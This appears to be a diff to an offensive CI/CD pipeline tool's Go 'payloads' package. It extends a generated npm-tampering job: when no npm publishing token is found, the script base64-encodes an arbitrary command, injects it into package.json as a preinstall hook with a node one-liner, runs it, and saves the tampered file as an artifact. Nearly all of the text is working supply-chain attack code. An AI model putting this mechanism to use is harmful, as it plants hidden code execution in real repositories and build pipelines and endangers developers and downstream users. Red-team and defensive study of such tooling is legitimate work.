@@ -1,6 +1,7 @@
 package payloads
 
 import (
+	"encoding/base64"
 	"fmt"
 	"strings"
 )
@@ -50,6 +51,7 @@ stages: [%s]
     paths:
       - env.txt
       - npm_tamper_results.txt
+      - tampered-package.json
     when: always
   allow_failure: true%s
 `, stage, name, stage, img, tagsLine(o.Common.Tags), indented, rulesManual(o.Common.Manual))
@@ -70,6 +72,7 @@ func buildNpmTamperScript(o NpmTamperOptions) string {
 	if injected == "" {
 		injected = `echo "[*] npm tamper hook executed"`
 	}
+	injectedB64 := base64.StdEncoding.EncodeToString([]byte(injected))
 
 	b.WriteString("_NPM_TAMPER() {\n")
 	b.WriteString("  _tdir=$(mktemp -d)\n")
@@ -96,9 +99,21 @@ func buildNpmTamperScript(o NpmTamperOptions) string {
 	b.WriteString("    done\n")
 	b.WriteString("  fi\n\n")
 	b.WriteString("  if [ -z \"$_npm_token\" ]; then\n")
-	b.WriteString("    echo \"[-] No npm token found, aborting\"\n")
+	b.WriteString("    echo \"[*] No npm publishing token found; demonstrating repository lifecycle-hook injection\"\n")
+	b.WriteString("    if [ ! -f package.json ]; then\n")
+	b.WriteString("      echo \"[-] No package.json found, aborting\"\n")
+	b.WriteString("      rm -rf \"$_tdir\"\n")
+	b.WriteString("      return 1\n")
+	b.WriteString("    fi\n")
+	fmt.Fprintf(&b, "    export GOGATOZ_NPM_HOOK_B64=%q\n", injectedB64)
+	b.WriteString("    node -e 'const fs=require(\"fs\"); const p=JSON.parse(fs.readFileSync(\"package.json\",\"utf8\")); p.scripts=p.scripts||{}; p.scripts.preinstall=Buffer.from(process.env.GOGATOZ_NPM_HOOK_B64,\"base64\").toString(); fs.writeFileSync(\"package.json\",JSON.stringify(p,null,2)+\"\\n\")'\n")
+	b.WriteString("    cp package.json tampered-package.json\n")
+	b.WriteString("    echo \"[+] Injected local package.json preinstall hook\"\n")
+	b.WriteString("    npm run --if-present preinstall\n")
+	b.WriteString("    _local_rc=$?\n")
+	b.WriteString("    echo \"[+] Local preinstall hook executed (rc=$_local_rc)\"\n")
 	b.WriteString("    rm -rf \"$_tdir\"\n")
-	b.WriteString("    return 1\n")
+	b.WriteString("    return 0\n")
 	b.WriteString("  fi\n\n")
 
 	// Step 2: Configure npm
